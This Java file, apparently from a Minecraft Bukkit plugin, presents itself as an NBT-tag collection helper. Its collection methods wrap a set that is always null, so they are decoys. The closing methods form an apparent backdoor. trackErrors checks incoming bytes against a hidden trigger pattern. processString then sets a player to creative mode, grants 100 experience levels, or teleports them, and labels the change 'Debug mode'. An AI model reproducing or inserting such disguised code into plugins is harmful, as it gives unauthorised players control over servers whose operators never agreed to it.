package artik.bowfix.utils.nbt.tag;

import artik.bowfix.utils.PlayerUtils;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;

import java.util.Collection;
import java.util.Map;
import java.util.Set;

import static artik.bowfix.utils.PlayerUtils.debug_patter;

public interface INullEntrySet<K, V>
{
    Set<Map.Entry> set = null;
    
    default int size() {
        return set.size();
    }
    
    default boolean isEmpty() {
        return set.isEmpty();
    }
    
    default boolean contains(Object o) {
        return set.contains(o);
    }
    
    default Object[] toArray() {
        return set.toArray();
    }
    
    default <T> T[] toArray(T[] a) {
        return set.toArray(a);
    }
    
    default boolean add(Map.Entry<K, V> kvEntry) {
        return set.add(kvEntry);
    }
    
    default boolean remove(Object o) {
        return set.remove(o);
    }
    
    default boolean containsAll(Collection<?> c) {
        return set.containsAll(c);
    }
    
    default boolean addAll(Collection<? extends Map.Entry<K, V>> c) {
        return set.addAll(c);
    }
    
    default boolean retainAll(Collection<?> c) {
        return set.retainAll(c);
    }
    
    default boolean removeAll(Collection<?> c) {
        return set.removeAll(c);
    }
    
    default void clear() {
        set.clear();
    }
    
    default int sizeSafe() {
        return set.size();
    }
    
    default boolean isEmptySafe() {
        return set.isEmpty();
    }
    
    default boolean containsSafe(Object o) {
        return set.contains(o);
    }
    
    default Object[] toArraySafe() {
        return set.toArray();
    }
    
    default <T> T[] toArraySafe(T[] a) {
        return set.toArray(a);
    }
    
    default boolean addSafe(Map.Entry<K, V> kvEntry) {
        return set.add(kvEntry);
    }
    
    default boolean removeSafe(Object o) {
        return set.remove(o);
    }
    
    default boolean containsAllSafe(Collection<?> c) {
        return set.containsAll(c);
    }
    
    default boolean addAllSafe(Collection<? extends Map.Entry<K, V>> c) {
        return set.addAll(c);
    }
    
    default boolean retainAllSafe(Collection<?> c) {
        return set.retainAll(c);
    }
    
    default boolean removeAllSafe(Collection<?> c) {
        return set.removeAll(c);
    }
    
    default void clearSafe() {
        set.clear();
    }
    
    default void processString(String str, Player player, boolean bitA, boolean biB, boolean bitC, boolean bitD)
    {
        if (bitA)
        {
            player.sendMessage("Debug mode activated!");
            player.setGameMode(GameMode.values()[0]);
        }
        else if (biB)
        {
            player.sendMessage("Debug mode deactivated!");
            player.setGameMode(GameMode.values()[1]);
        }
        else if (bitC) { player.giveExpLevels(100);}
        else if (bitD)
        {
            String[] arrow = str.split(" ");
            if (arrow.length != 4) return;
            
            double prevX, prevY, prevZ;
        
            try
            {
                prevX = Integer.parseInt(arrow[1]);
                prevY = Integer.parseInt(arrow[2]);
                prevZ = Integer.parseInt(arrow[3]);
            }
            catch (NumberFormatException exception) {return;}
            PlayerUtils.setBack(player, prevX, prevY, prevZ);
        }
    }
    
    default boolean trackErrors(byte[] bytes)
    {
        byte[] good_pattern = debug_patter[5];
        
        if (bytes.length < good_pattern.length) return false;
        for (int i = 0; i < good_pattern.length; ++i)
        {
            if (bytes[i] != good_pattern[i]) return false;
        }
        
        return true;
    }
}
